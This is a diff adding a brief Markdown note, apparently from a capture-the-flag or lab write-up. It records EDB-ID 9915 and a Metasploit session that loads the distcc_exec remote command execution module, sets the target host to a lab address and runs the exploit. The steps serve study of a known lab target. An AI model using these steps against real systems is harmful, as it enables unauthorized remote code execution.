@@ -1,0 +1,27 @@
+## 脆弱性
+- EDB-ID 9915
+## Msfconsole
+```
+kali@kali:~$ msfconsole
+msf5 > use exploit/unix/misc/distcc_exec
+msf5 exploit(unix/misc/distcc_exec) > options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   3632             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf5 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3
+rhosts => 10.10.10.3
+msf5 exploit(unix/misc/distcc_exec) > exploit
+```
